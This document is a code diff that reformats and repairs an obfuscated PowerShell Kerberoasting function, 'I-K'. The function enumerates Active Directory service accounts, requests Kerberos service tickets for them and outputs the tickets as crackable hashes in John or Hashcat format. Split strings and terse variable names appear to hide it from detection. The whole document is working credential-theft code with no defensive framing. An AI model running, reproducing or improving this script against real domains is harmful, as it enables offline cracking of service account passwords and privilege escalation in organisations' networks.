@@ -1,64 +1,144 @@
 function I-K {
-    [CmdletBinding()]Param(
+    [CmdletBinding()]
+    Param(
         [String[]]$I,
         [Switch]$A,
         [String]$D,
         [String]$F,
         [String]$S,
-        [String]$P='Subtree',
-        [Int]$R=200,
-        [Management.Automation.PSCredential]$C=[Management.Automation.PSCredential]::Empty,
-        [String]$O='John'
+        [String]$P = 'Subtree',
+        [Int]$R = 200,
+        [Management.Automation.PSCredential]$C = [Management.Automation.PSCredential]::Empty,
+        [String]$O = 'John'
     )
     Begin {
-        $Null=[Reflection.Assembly]::LoadWithPartialName('System.'+'IdentityModel')
-        $L='L'+'DAP://'
-        $Q=if($D){$D}else{[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name}
-        $B=if($C-eq[Management.Automation.PSCredential]::Empty){try{[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name}catch{$Null}}else{try{(New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain',$Q,$C.UserName,$C.GetNetworkCredential().Password)).Name}catch{$Null}}
-        $T=if($B){$L+$B+'/'+if($D){"DC=$($D.Replace('.',',DC='))"}else{$Null}}else{$L+"DC=$($Q.Replace('.',',DC='))"}
-        $E=if($C-eq[Management.Automation.PSCredential]::Empty){[ADSI]$T}else{New-Object DirectoryServices.DirectoryEntry($T,$C.UserName,$C.GetNetworkCredential().Password)}
-        $X=New-Object System.DirectoryServices.DirectorySearcher($E)
-        $X.PageSize=$R
-        $X.SearchScope=$P
-        $X.CacheResults=$False
+        $Null = [Reflection.Assembly]::LoadWithPartialName('System.' + 'IdentityModel')
+
+        $L = 'L' + 'DAP://'
+
+        $Q = if ($D) { $D } else { [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name }
+
+        $B = if ($C -eq [Management.Automation.PSCredential]::Empty) {
+            try { [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name } catch { $Null }
+        } else {
+            try {
+                (New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(
+                    'Domain', $Q, $C.UserName, $C.GetNetworkCredential().Password
+                )).Name
+            } catch { $Null }
+        }
+
+        # FIX: use $() for inline if, and '' instead of $Null to avoid `+ $Null`
+        $T = if ($B) {
+            $L + $B + '/' + $( if ($D) { "DC=$($D.Replace('.', ',DC='))" } else { '' } )
+        } else {
+            $L + "DC=$($Q.Replace('.', ',DC='))"
+        }
+
+        $E = if ($C -eq [Management.Automation.PSCredential]::Empty) {
+            [ADSI]$T
+        } else {
+            New-Object DirectoryServices.DirectoryEntry($T, $C.UserName, $C.GetNetworkCredential().Password)
+        }
+
+        $X = New-Object System.DirectoryServices.DirectorySearcher($E)
+        $X.PageSize     = $R
+        $X.SearchScope  = $P
+        $X.CacheResults = $False
     }
     Process {
-        $G=''
-        $I|?{$_}|%{$N=$_;if($N-match'^S-1-.*'){$G+="(objectsid=$N)"}elseif($N-match'^CN=.*'){$G+="(distinguishedname=$N)"}else{try{$Null=[System.Guid]::Parse($N);$G+="(objectguid=$N)"}catch{$G+="(samAccountName=$N)"}}}
-        $H="(&(samAccountType=805306368)(servicePrincipalName=*)"+$(if($G){"(|$G)"})+(if($A){"(admincount=1)"})+(if($F){$F})+")"
-        $X.filter=$H
-        $X.FindAll()|?{$_}|%{
-            $U=New-Object PSObject
-            $Z=$_.Properties
-            $Z.PropertyNames|%{
-                $K=$_;$V=$Z[$K]
-                if($K-in@('objectsid','sidhistory')){$U|Add-Member Noteproperty $K (New-Object System.Security.Principal.SecurityIdentifier($V[0],0)).Value}
-                elseif($K-eq'objectguid'){$U|Add-Member Noteproperty $K (New-Object Guid(,$V[0])).Guid}
-                elseif($K-eq'ntsecuritydescriptor'){$U|Add-Member Noteproperty $K (New-Object Security.AccessControl.RawSecurityDescriptor $V[0],0)}
-                elseif($K-in@('lastlogon','lastlogontimestamp','pwdlastset','lastlogoff','badPasswordTime')){$U|Add-Member Noteproperty $K ([datetime]::FromFileTime([Int64]$V[0]))}
-                elseif($V[0]-is[System.MarshalByRefObject]){try{$M=$V[0];$H=$M.GetType().InvokeMember('HighPart',[System.Reflection.BindingFlags]::GetProperty,$Null,$M,$Null);$L=$M.GetType().InvokeMember('LowPart',[System.Reflection.BindingFlags]::GetProperty,$Null,$M,$Null);$U|Add-Member Noteproperty $K ([Int64]("0x{0:x8}{1:x8}"-f$H,$L))}catch{$U|Add-Member Noteproperty $K $V}}
-                elseif($V.count-eq1){$U|Add-Member Noteproperty $K $V[0]}else{$U|Add-Member Noteproperty $K $V}
+        $G = ''
+        $I | ? { $_ } | % {
+            $N = $_
+            if ($N -match '^S-1-.*') {
+                $G += "(objectsid=$N)"
             }
+            elseif ($N -match '^CN=.*') {
+                $G += "(distinguishedname=$N)"
+            }
+            else {
+                try {
+                    $Null = [System.Guid]::Parse($N)
+                    $G += "(objectguid=$N)"
+                } catch {
+                    $G += "(samAccountName=$N)"
+                }
+            }
+        }
+
+        # FIX: use $() around inline ifs concatenated with +
+        $H = "(&(samAccountType=805306368)(servicePrincipalName=*)" +
+             $( if ($G) { "(|$G)" } else { '' } ) +
+             $( if ($A) { "(admincount=1)" } else { '' } ) +
+             $( if ($F) { $F } else { '' } ) +
+             ")"
+
+        $X.Filter = $H
+
+        $X.FindAll() | ? { $_ } | % {
+            $U = New-Object PSObject
+            $Z = $_.Properties
+
+            $Z.PropertyNames | % {
+                $K = $_
+                $V = $Z[$K]
+
+                if ($K -in @('objectsid','sidhistory')) {
+                    $U | Add-Member NoteProperty $K (New-Object System.Security.Principal.SecurityIdentifier($V[0],0)).Value
+                }
+                elseif ($K -eq 'objectguid') {
+                    $U | Add-Member NoteProperty $K (New-Object Guid(,$V[0])).Guid
+                }
+                elseif ($K -eq 'ntsecuritydescriptor') {
+                    $U | Add-Member NoteProperty $K (New-Object Security.AccessControl.RawSecurityDescriptor $V[0],0)
+                }
+                elseif ($K -in @('lastlogon','lastlogontimestamp','pwdlastset','lastlogoff','badPasswordTime')) {
+                    $U | Add-Member NoteProperty $K ([datetime]::FromFileTime([Int64]$V[0]))
+                }
+                elseif ($V[0] -is [System.MarshalByRefObject]) {
+                    try {
+                        $M = $V[0]
+                        $Hh = $M.GetType().InvokeMember('HighPart',[System.Reflection.BindingFlags]::GetProperty,$Null,$M,$Null)
+                        $Ll = $M.GetType().InvokeMember('LowPart' ,[System.Reflection.BindingFlags]::GetProperty,$Null,$M,$Null)
+                        $U | Add-Member NoteProperty $K ([Int64]("0x{0:x8}{1:x8}" -f $Hh,$Ll))
+                    } catch {
+                        $U | Add-Member NoteProperty $K $V
+                    }
+                }
+                elseif ($V.Count -eq 1) {
+                    $U | Add-Member NoteProperty $K $V[0]
+                }
+                else {
+                    $U | Add-Member NoteProperty $K $V
+                }
+            }
+
             $U.PSObject.TypeNames.Insert(0,'PV.U')
-            if($U.SamAccountName-notmatch'krbtgt'){
-                $W=$U.ServicePrincipalName
-                $J=New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $W
-                $B=$J.GetRequest()
-                if($B){
-                    $S=[System.BitConverter]::ToString($B)-replace'-'
-                    $A=($S-replace'^(.*?)04820...(.*)','$2')-Split'A48201'
-                    $A.RemoveAt($A.Count-1)
-                    $M=($A-join'A48201').Insert(32,'$')
-                    $R=New-Object PSObject
-                    $R|Add-Member Noteproperty 'SamAccountName' $U.SamAccountName
-                    $R|Add-Member Noteproperty 'DistinguishedName' $U.distinguishedname
-                    $R|Add-Member Noteproperty 'ServicePrincipalName' $W
-                    $R|Add-Member Noteproperty 'Hash' $(if($O-eq'John'){"`$krb5tgs`$unknown:$M"}else{'$krb5tgs$23$*ID#124_DN:'+$U.distinguishedname+' SPN:'+$W+'*'+$M})
+
+            if ($U.SamAccountName -notmatch 'krbtgt') {
+                $W = $U.ServicePrincipalName
+
+                $J = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $W
+                $Bbytes = $J.GetRequest()
+
+                if ($Bbytes) {
+                    $S = [System.BitConverter]::ToString($Bbytes) -replace '-'
+                    $A = ($S -replace '^(.*?)04820...(.*)','$2') -split 'A48201'
+                    $A.RemoveAt($A.Count - 1)
+                    $M = ($A -join 'A48201').Insert(32,'$')
+
+                    $R = New-Object PSObject
+                    $R | Add-Member NoteProperty 'SamAccountName'       $U.SamAccountName
+                    $R | Add-Member NoteProperty 'DistinguishedName'    $U.distinguishedname
+                    $R | Add-Member NoteProperty 'ServicePrincipalName' $W
+                    $R | Add-Member NoteProperty 'Hash' $( if ($O -eq 'John') { "`$krb5tgs`$unknown:$M" } else { '$krb5tgs$23$*ID#124_DN:' + $U.distinguishedname + ' SPN:' + $W + '*' + $M } )
+
                     $R.PSObject.TypeNames.Insert(0,'PV.T')
                     $R
                 }
             }
         }
-        $X.dispose()
+
+        $X.Dispose()
     }
 }
